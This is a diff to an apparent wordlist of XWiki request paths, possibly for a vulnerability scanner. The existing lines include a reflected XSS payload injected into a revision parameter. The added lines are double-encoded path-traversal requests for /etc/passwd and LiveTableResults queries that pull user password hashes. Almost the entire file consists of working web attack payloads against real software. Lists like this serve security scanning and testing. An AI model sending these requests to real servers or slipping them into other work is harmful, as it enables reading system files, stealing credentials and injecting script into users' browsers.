@@ -45,3 +45,7 @@
 /bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f
 /xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f
 /bin/view/Sandbox/?viewer=changes&rev1=9.1&rev2=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F17.6.0q1che%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Evfu80q44msz&form_token=test&language=en
+/xwiki/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/xwiki/bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
+/bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
